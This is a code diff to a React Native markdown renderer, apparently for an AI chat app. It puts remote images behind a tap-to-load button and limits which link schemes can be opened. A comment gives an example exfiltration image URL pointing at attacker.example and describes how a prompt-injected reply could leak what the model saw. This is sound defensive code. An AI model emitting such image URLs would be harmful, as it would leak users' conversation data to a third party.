@@ -21,10 +21,10 @@
  * not the default bundle.
  */
 
-import { useMemo, useState } from "react";
+import { useEffect, useMemo, useState } from "react";
 import MarkdownDisplay, { MarkdownIt } from "react-native-markdown-display";
 import type { ASTNode, RenderRules } from "react-native-markdown-display";
-import { Pressable, ScrollView, StyleSheet, Text, View } from "react-native";
+import { Image, Pressable, ScrollView, StyleSheet, Text, View } from "react-native";
 import type { StyleProp, ViewStyle } from "react-native";
 import * as Clipboard from "expo-clipboard";
 import * as haptics from "../haptics";
@@ -97,7 +97,75 @@ function codeRule(node: ASTNode) {
   return <CodeBlock key={node.key} code={node.content.replace(/\n$/, "")} language={info.split(/\s+/)[0] ?? ""} />;
 }
 
-const rules: RenderRules = { fence: codeRule, code_block: codeRule };
+/** An image already in the reply (a data URL), sized to its own proportions. */
+function InlineImage({ uri, alt }: { uri: string; alt?: string }) {
+  const [ratio, setRatio] = useState(4 / 3);
+  useEffect(() => {
+    Image.getSize(uri, (w, h) => h > 0 && setRatio(w / h), () => undefined);
+  }, [uri]);
+  return (
+    <Image
+      source={{ uri }}
+      accessibilityLabel={alt}
+      style={[styles.image, { aspectRatio: ratio }]}
+      resizeMode="contain"
+    />
+  );
+}
+
+/**
+ * An image from the web, loaded only when tapped. A reply can be steered by a
+ * page the model read, and an image is fetched the moment it renders, so
+ * `![](https://attacker.example/p.png?d=…)` would carry off whatever the model
+ * had seen without a tap.
+ */
+function RemoteImage({ uri, alt }: { uri: string; alt?: string }) {
+  const theme = useTheme();
+  const [shown, setShown] = useState(false);
+  if (shown) return <InlineImage uri={uri} alt={alt} />;
+  let host = uri;
+  try {
+    host = new URL(uri).host;
+  } catch {
+    /* keep the URL as written */
+  }
+  return (
+    <Pressable
+      accessibilityRole="button"
+      accessibilityLabel={`Load image from ${host}`}
+      onPress={() => setShown(true)}
+      style={({ pressed }) => [
+        styles.remoteImage,
+        { borderColor: theme.color.separator, backgroundColor: theme.color.surfaceAlt },
+        pressed && { opacity: 0.6 },
+      ]}
+    >
+      <Icon name="photo" size={13} weight="medium" color={theme.color.textDim} />
+      <Text style={[styles.remoteImageLabel, { color: theme.color.textDim }]} numberOfLines={1}>
+        Load image{alt ? ` “${alt}”` : ""} from {host}
+      </Text>
+    </Pressable>
+  );
+}
+
+function imageRule(node: ASTNode) {
+  const src = String(node.attributes.src ?? "");
+  const alt = typeof node.attributes.alt === "string" && node.attributes.alt ? node.attributes.alt : undefined;
+  if (/^data:image\/(png|gif|jpeg|webp);base64,/i.test(src)) return <InlineImage key={node.key} uri={src} alt={alt} />;
+  if (/^https?:\/\//i.test(src)) return <RemoteImage key={node.key} uri={src} alt={alt} />;
+  // The library would load anything else from https:// + src; nothing here.
+  return null;
+}
+
+/**
+ * Links a tap may open. Anything else in a reply (`shortcuts://…`, another
+ * app's scheme) is left inert: the text came from a model, not from the user.
+ */
+function openable(url: string): boolean {
+  return /^(https?:|mailto:|tel:)/i.test(url.trim());
+}
+
+const rules: RenderRules = { fence: codeRule, code_block: codeRule, image: imageRule };
 
 export interface MarkdownProps {
   children: string;
@@ -171,7 +239,7 @@ export default function Markdown({ children, style }: MarkdownProps) {
 
   return (
     <View style={style}>
-      <MarkdownDisplay style={markdownStyle} markdownit={parser} rules={rules}>
+      <MarkdownDisplay style={markdownStyle} markdownit={parser} rules={rules} onLinkPress={openable}>
         {children}
       </MarkdownDisplay>
     </View>
@@ -193,4 +261,19 @@ const styles = StyleSheet.create({
   codeCopyLabel: { fontSize: 12, fontWeight: "500" },
   codeScroll: { paddingHorizontal: 12, paddingTop: 4, paddingBottom: 12 },
   codeText: { fontSize: 13, lineHeight: 19 },
+  image: { width: "100%", borderRadius: 10, marginVertical: 6 },
+  remoteImage: {
+    flexDirection: "row",
+    alignItems: "center",
+    alignSelf: "flex-start",
+    gap: 6,
+    marginVertical: 6,
+    paddingHorizontal: 12,
+    paddingVertical: 8,
+    borderRadius: 10,
+    borderWidth: StyleSheet.hairlineWidth,
+    borderStyle: "dashed",
+    maxWidth: "100%",
+  },
+  remoteImageLabel: { fontSize: 13, flexShrink: 1 },
 });
